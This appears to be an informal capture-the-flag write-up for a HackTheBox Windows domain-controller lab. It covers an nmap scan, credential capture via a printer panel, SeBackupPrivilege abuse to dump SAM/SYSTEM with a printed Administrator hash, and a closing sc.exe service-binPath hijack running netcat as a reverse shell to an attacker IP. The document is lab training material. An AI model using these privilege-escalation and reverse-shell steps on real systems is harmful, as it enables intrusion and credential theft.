AD


```sh
Host is up (0.035s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-31 13:07:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 18m36s
| smb2-time: 
|   date: 2026-07-31T13:08:11
|_  start_date: N/A

```



since port 80 is open lets check that 

![[Pasted image 20260731151449.png]]

![[Pasted image 20260731152116.png]]

![[Pasted image 20260731152136.png]]

lets see if we can capture something 
![[Pasted image 20260731152147.png]]

niceeee

![[Pasted image 20260731152108.png]]


bingo 

![[Pasted image 20260731155536.png]]


![[Pasted image 20260731155805.png]]


maybe inseting 

![[Pasted image 20260731161202.png]]

in blood this could be something

![[Pasted image 20260731161406.png]]



but more over this is more intersting for priv escalation and easier

![[Pasted image 20260731162023.png]]

seBackupPriv

dump sam and system and lets see if we can extract something interting 

![[Pasted image 20260731162144.png]]


there is admin here 

![[Pasted image 20260731162314.png]]

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::`


cant crack it niether PTH

intersting that i found  out i cant see the file is there by anychance i can backit up ?
![[Pasted image 20260731163617.png]]


**The concept:** you can't just `type` the file — normal read still checks the ACL. You have to open it _using the backup semantics_ (the `FILE_FLAG_BACKUP_SEMANTICS` intent), which is what invokes the privilege.

so we can do this 

upload some dlls  for backupprivilege

![[Pasted image 20260731164908.png]]


![[Pasted image 20260731164933.png]]


and then just do type 



the official walk-though did it like this 

numerating group memberships reveals that svc-printer is part of Server Operators group.

 Members of this group can start/stop system services.

modify a service binary path to obtain a reverse shell

```sh
upload /usr/share/windows-resources/binaries/nc.exe

# Service Control Manager to config the service of vss to the path of nc and execute a command 
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2 1234



sc.exe stop vss
sc.exe start vss


```